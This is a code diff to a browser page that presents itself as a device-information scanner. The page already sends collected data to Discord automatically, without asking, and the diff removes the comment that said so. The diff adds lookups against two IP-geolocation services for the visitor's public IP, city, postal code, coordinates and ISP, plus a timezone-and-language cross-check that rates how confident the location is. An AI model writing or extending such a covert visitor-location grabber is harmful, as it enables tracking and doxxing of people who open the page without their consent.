@@ -171,6 +171,8 @@
     "Reading browser storage...",
     "Detecting battery...",
     "Checking connection type...",
+    "Tracing public IP address...",       // NEW
+    "Resolving approximate location...",  // NEW
     "Measuring performance baseline...",
     "Finalizing full report...",
   ];
@@ -195,11 +197,7 @@
       await sleep(220 + Math.random() * 200);
     }
     await sleep(400);
-    
-    // Populate the UI
     await showResults();
-    
-    // AUTOMATIC SEND TO DISCORD
     sendToDiscord();
   }
 
@@ -290,6 +288,94 @@
     return { model:'Unknown', note:'Could not determine' };
   }
 
+  /* ── IP / LOCATION (no permission needed) ── */
+  async function getIPLocation() {
+    // Source 1: ipapi.co (primary)
+    try {
+      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+      if (r.ok) {
+        const d = await r.json();
+        if (d && d.ip && !d.error) {
+          return {
+            ip:       d.ip,
+            city:     d.city      || null,
+            region:   d.region    || null,
+            country:  d.country_name || null,
+            countryCode: d.country || null,
+            postal:   d.postal    || null,
+            lat:      d.latitude  || null,
+            lon:      d.longitude || null,
+            isp:      d.org       || null,
+            asn:      d.asn       || null,
+            source:   'ipapi.co'
+          };
+        }
+      }
+    } catch {}
+
+    // Source 2: ip-api.com (fallback — HTTP only, will work on non-HTTPS pages)
+    try {
+      const r = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query', {
+        signal: AbortSignal.timeout(5000)
+      });
+      if (r.ok) {
+        const d = await r.json();
+        if (d && d.status === 'success') {
+          return {
+            ip:      d.query,
+            city:    d.city       || null,
+            region:  d.regionName || null,
+            country: d.country    || null,
+            postal:  d.zip        || null,
+            lat:     d.lat        || null,
+            lon:     d.lon        || null,
+            isp:     d.isp        || null,
+            asn:     d.as         || null,
+            source:  'ip-api.com'
+          };
+        }
+      }
+    } catch {}
+
+    return null;
+  }
+
+  /* Confidence label based on how many signals agree */
+  function getLocationConfidence(ipData) {
+    if (!ipData) return null;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone; // e.g. "Asia/Manila"
+    const lang = navigator.language || '';                        // e.g. "en-PH"
+
+    let signals = 0, matches = 0;
+
+    // Timezone country match
+    if (ipData.countryCode && tz) {
+      signals++;
+      // rough: timezone string often contains region name or country hint
+      const tzLower = tz.toLowerCase();
+      const cityLower = (ipData.city || '').toLowerCase();
+      const regionLower = (ipData.region || '').toLowerCase();
+      if (
+        tzLower.includes(cityLower.split(' ')[0]) ||
+        tzLower.includes(regionLower.split(' ')[0]) ||
+        tzLower.includes((ipData.countryCode || '').toLowerCase())
+      ) matches++;
+    }
+
+    // Language country code match (e.g. "en-PH" → PH)
+    if (lang.includes('-') && ipData.countryCode) {
+      signals++;
+      const langCountry = lang.split('-')[1].toUpperCase();
+      if (langCountry === (ipData.countryCode || '').toUpperCase()) matches++;
+    }
+
+    if (signals === 0) return 'Low';
+    const ratio = matches / signals;
+    if (ratio >= 1)   return 'High';
+    if (ratio >= 0.5) return 'Medium';
+    return 'Low';
+  }
+
   /* ── GRID BUILDERS ── */
   let _grid = null;
   const _data = {};
@@ -326,6 +412,8 @@
     const arch  = getArch(ua);
     const ram   = navigator.deviceMemory;
     const cores = navigator.hardwareConcurrency;
+    const ipLoc  = await getIPLocation();           // NEW
+    const locConf = getLocationConfidence(ipLoc);   // NEW
 
     let os = 'Unknown';
     if      (/Windows NT 10/.test(ua))    os = 'Windows 10 / 11';
@@ -406,10 +494,31 @@
       row('Connection Info', 'Not available', 'limited', 'Network API not supported');
     }
 
+    /* ── LOCATION SECTION (NEW) ── */
+    section('LOCATION');
+    if (ipLoc) {
+      row('Public IP',    ipLoc.ip, '', 'Your outward-facing IP');
+      if (ipLoc.city)    row('City',    ipLoc.city,   'limited', 'IP-based, ~city accuracy');
+      if (ipLoc.region)  row('Region',  ipLoc.region, 'limited', 'IP-based estimate');
+      if (ipLoc.country) row('Country', ipLoc.country,'limited', 'IP-based estimate');
+      if (ipLoc.postal)  row('Postal',  ipLoc.postal, 'limited', 'May not match exactly');
+      if (ipLoc.lat && ipLoc.lon)
+        row('Approx Coords', `${Number(ipLoc.lat).toFixed(4)}, ${Number(ipLoc.lon).toFixed(4)}`, 'limited', 'City-level precision only');
+      if (ipLoc.isp)     row('ISP / Org', ipLoc.isp, '', '');
+      if (ipLoc.asn)     row('ASN', ipLoc.asn, '', '');
+      if (locConf)       row('Signal Confidence', locConf === 'High' ? '🟢 High' : locConf === 'Medium' ? '🟡 Medium' : '🔴 Low',
+                             locConf === 'High' ? '' : 'limited', 'Timezone + language cross-check');
+    } else {
+      row('Public IP',  'Lookup failed', 'unavailable', 'Could not reach geolocation API');
+      row('Location',   'Unavailable',   'unavailable', 'IP lookup blocked or timed out');
+    }
+
+    /* Timezone is always available — reinforce location context */
+    row('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone, '', 'From browser (no permission needed)');
+
     section('LOCALE');
     row('Language',      navigator.language || 'Unknown');
     row('All Languages', (navigator.languages || []).join(', ') || 'Unknown');
-    row('Timezone',      Intl.DateTimeFormat().resolvedOptions().timeZone);
     row('Do Not Track',  navigator.doNotTrack === '1' ? 'Enabled' : 'Not set');
 
     section('BROWSER');
